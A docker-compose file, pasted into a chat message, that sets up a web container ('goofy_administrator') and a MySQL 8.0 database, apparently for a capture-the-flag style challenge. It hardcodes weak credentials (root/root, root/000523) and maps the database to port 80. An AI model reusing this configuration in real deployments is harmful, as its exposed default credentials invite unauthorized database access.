[송민영] [오전 2:33] version: '3'                                                                                                                                                                                               
services:
    web:
        build:
            context: .
            dockerfile: Dockerfile
        container_name: goofy-web
        depends_on:
            - db
        volumes:
            - ./prob:/var/www/html/goofy_administrator/
        ports:
            - "22210:80"
        environment:
            DB_HOST: db
            DB_NAME: poxroot$$
            DB_USER: root
            DB_PASSWORD : 000523
    db:
        container_name: goofy-db
        image: mysql:8.0
        command: --default-authentication-plugin=mysql_native_password
        restart: always
        environment:
            MYSQL_ROOT_PASSWORD: root
            MYSQL_DATABASE: poxroot$$
            MYSQL_USER: root
            MYSQL_PASSWORD: 000523
        ports:
            - "23211:80"
        volumes:
            - "./goofy-db/:/docker-entrypoint-initdb.d/"
